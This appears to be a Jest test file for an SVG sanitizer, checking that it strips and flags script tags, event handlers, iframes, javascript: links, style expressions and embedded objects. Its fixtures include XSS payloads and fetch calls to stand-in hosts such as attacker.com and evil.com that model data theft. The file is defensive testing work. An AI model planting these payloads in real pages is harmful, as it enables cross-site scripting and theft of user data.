const svgSanitizer = require('../modules/extractors/svgSanitizer');

describe('svgSanitizer - SVG security hardening and metadata removal', () => {
  describe('sanitizeSvg - XSS payload removal', () => {
    test('should remove metadata tags containing sensitive information', () => {
      const maliciousSvg = '<svg><metadata><author>attacker</author><license>stolen</license></metadata></svg>';
      const result = svgSanitizer.sanitizeSvg(maliciousSvg);

      expect(result).not.toContain('<metadata');
      expect(result).not.toContain('author');
      expect(result).not.toContain('attacker');
    });

    test('should remove script tags regardless of content', () => {
      const vectorScript = [
        '<svg><script>alert("xss")</script></svg>',
        '<svg><script type="text/javascript">fetch("/api/steal")</script></svg>',
        '<svg><SCRIPT>eval(String.fromCharCode(...))</SCRIPT></svg>',
      ];

      vectorScript.forEach(svg => {
        const result = svgSanitizer.sanitizeSvg(svg);
        expect(result.toLowerCase()).not.toContain('<script');
      });
    });

    test('should remove event handler attributes (onclick, onload, onmouseover, etc.)', () => {
      const eventHandlers = [
        { svg: '<svg><rect onclick="alert(1)"/></svg>', handler: 'onclick' },
        { svg: '<svg><circle onload="steal()"/></svg>', handler: 'onload' },
        { svg: '<svg><path onmouseover="x"/></svg>', handler: 'onmouseover' },
        { svg: '<svg><g onenter="hack()"/></svg>', handler: 'onenter' },
      ];

      eventHandlers.forEach(({ svg, handler }) => {
        const result = svgSanitizer.sanitizeSvg(svg);
        expect(result).not.toContain(handler);
      });
    });

    test('should remove iframe elements (frame injection attack)', () => {
      const svg = '<svg><iframe src="http://attacker.com/phishing"></iframe></svg>';
      const result = svgSanitizer.sanitizeSvg(svg);

      expect(result).not.toContain('<iframe');
      expect(result).not.toContain('attacker.com');
    });

    test('should remove object and embed tags (plugin execution)', () => {
      const objectSvg = '<svg><object data="malware.swf"></object></svg>';
      const embedSvg = '<svg><embed src="payload.wasm"></embed></svg>';

      const result1 = svgSanitizer.sanitizeSvg(objectSvg);
      const result2 = svgSanitizer.sanitizeSvg(embedSvg);

      expect(result1).not.toContain('<object');
      expect(result2).not.toContain('<embed');
    });

    test('should replace javascript: protocol with safe anchor link', () => {
      const jsProtocol = '<svg><a href="javascript:void(fetch(\'http://evil.com\'))">click</a></svg>';
      const result = svgSanitizer.sanitizeSvg(jsProtocol);

      expect(result).not.toContain('javascript:');
      expect(result).toContain('href="#"');
    });

    test('should remove style tags with malicious expressions', () => {
      const maliciousStyle = '<svg><style>body { background: url(javascript:alert(1)) }</style></svg>';
      const result = svgSanitizer.sanitizeSvg(maliciousStyle);

      expect(result).not.toContain('javascript:');
    });

    test('should preserve legitimate SVG content and structure', () => {
      const safeSvg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">' +
                      '<circle cx="50" cy="50" r="40" fill="blue"/>' +
                      '<rect x="10" y="10" width="30" height="30" stroke="red"/>' +
                      '</svg>';
      const result = svgSanitizer.sanitizeSvg(safeSvg);

      expect(result).toContain('circle');
      expect(result).toContain('cx="50"');
      expect(result).toContain('fill="blue"');
      expect(result).toContain('rect');
    });

    test('should trim leading/trailing whitespace from result', () => {
      const svg = '   <svg></svg>   \n';
      const result = svgSanitizer.sanitizeSvg(svg);

      expect(result).not.toMatch(/^\s/);
      expect(result).not.toMatch(/\s$/);
    });

    test('should handle nested malicious structures deeply', () => {
      const nestedAttack = `
        <svg>
          <g>
            <script>
              var code = '<img src=x onerror="alert(1)">';
            </script>
            <rect onclick="eval(String.fromCharCode(65, 66, 67))"/>
          </g>
        </svg>
      `;
      const result = svgSanitizer.sanitizeSvg(nestedAttack);

      expect(result).not.toContain('<script');
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('eval');
    });

    test('should handle case-insensitive attack vectors', () => {
      const attacks = [
        '<svg><SCRIPT>alert(1)</SCRIPT></svg>',
        '<svg><ScRiPt>alert(1)</ScRiPt></svg>',
        '<svg><rect OnClick="x"></rect></svg>',
      ];

      attacks.forEach(svg => {
        const result = svgSanitizer.sanitizeSvg(svg);
        expect(result.toLowerCase()).not.toContain('<script');
        expect(result.toLowerCase()).not.toContain('onclick');
      });
    });
  });

  describe('validateSvgSecurity - Threat detection', () => {
    test('should detect metadata tags', () => {
      const svg = '<svg><metadata><author>John</author></metadata></svg>';
      const result = svgSanitizer.validateSvgSecurity(svg);

      expect(result.isSafe).toBe(false);
      expect(result.threats).toContain('Metadata detected');
    });

    test('should detect script tags and report as security threat', () => {
      const svg = '<svg><script>alert("xss")</script></svg>';
      const result = svgSanitizer.validateSvgSecurity(svg);

      expect(result.isSafe).toBe(false);
      expect(result.threats).toContain('Script tags detected');
    });

    test('should detect event handlers', () => {
      const svg = '<svg><rect onmouseover="alert(1)"/></svg>';
      const result = svgSanitizer.validateSvgSecurity(svg);

      expect(result.isSafe).toBe(false);
      expect(result.threats).toContain('Event handlers detected');
    });

    test('should detect iframe elements', () => {
      const svg = '<svg><iframe src="http://evil.com"/></svg>';
      const result = svgSanitizer.validateSvgSecurity(svg);

      expect(result.isSafe).toBe(false);
      expect(result.threats).toContain('iFrame detected');
    });

    test('should detect javascript: protocol in attributes', () => {
      const svg = '<svg><a href="javascript:fetch(\'http://evil.com\')"/></svg>';
      const result = svgSanitizer.validateSvgSecurity(svg);

      expect(result.isSafe).toBe(false);
      expect(result.threats).toContain('JavaScript protocol detected');
    });

    test('should detect embedded objects (object and embed tags)', () => {
      const svgObject = '<svg><object data="malware.swf"/></svg>';
      const svgEmbed = '<svg><embed src="payload.wasm"/></svg>';

      const result1 = svgSanitizer.validateSvgSecurity(svgObject);
      const result2 = svgSanitizer.validateSvgSecurity(svgEmbed);

      expect(result1.isSafe).toBe(false);
      expect(result2.isSafe).toBe(false);
      expect(result1.threats).toContain('Embedded objects detected');
    });

    test('should validate safe SVG as secure', () => {
      const safeSvg = '<svg xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="40"/></svg>';
      const result = svgSanitizer.validateSvgSecurity(safeSvg);

      expect(result.isSafe).toBe(true);
      expect(result.threats.length).toBe(0);
    });

    test('should report multiple threats when present', () => {
      const multiThreatSvg = `
        <svg>
          <metadata>x</metadata>
          <script>alert(1)</script>
          <rect onclick="y"/>
          <iframe src="z"/>
        </svg>
      `;
      const result = svgSanitizer.validateSvgSecurity(multiThreatSvg);

      expect(result.isSafe).toBe(false);
      expect(result.threats.length).toBeGreaterThanOrEqual(4);
    });

    test('should be case-insensitive for keyword detection', () => {
      const caseVariants = [
        '<svg><MetaData></MetaData></svg>',
        '<svg><SCRIPT></SCRIPT></svg>',
        '<svg><Iframe/></svg>',
      ];

      caseVariants.forEach(svg => {
        const result = svgSanitizer.validateSvgSecurity(svg);
        expect(result.isSafe).toBe(false);
        expect(result.threats.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Integration - Sanitize before validation', () => {
    test('should sanitized SVG pass security validation', () => {
      const maliciousSvg = `
        <svg xmlns="http://www.w3.org/2000/svg">
          <metadata><creator>Hacker</creator></metadata>
          <script>fetch('http://attacker.com/steal')</script>
          <circle cx="50" cy="50" r="40" onclick="alert(1)"/>
          <a href="javascript:void(0)">Click</a>
        </svg>
      `;

      const sanitized = svgSanitizer.sanitizeSvg(maliciousSvg);
      const validation = svgSanitizer.validateSvgSecurity(sanitized);

      expect(validation.isSafe).toBe(true);
      expect(validation.threats.length).toBe(0);
    });

    test('should preserve SVG functionality while removing security threats', () => {
      const mixedSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
          <metadata><copyright>2024</copyright></metadata>
          <circle cx="50" cy="50" r="40" fill="blue"/>
          <rect x="10" y="10" width="30" height="30" stroke="red" onclick="alert(1)"/>
          <path d="M 10 10 L 90 90"/>
        </svg>
      `;

      const sanitized = svgSanitizer.sanitizeSvg(mixedSvg);

      expect(sanitized).toContain('circle');
      expect(sanitized).toContain('cx="50"');
      expect(sanitized).toContain('fill="blue"');
      expect(sanitized).toContain('rect');
      expect(sanitized).toContain('path');
      expect(sanitized).not.toContain('onclick');
      expect(sanitized).not.toContain('metadata');
    });
  });
});
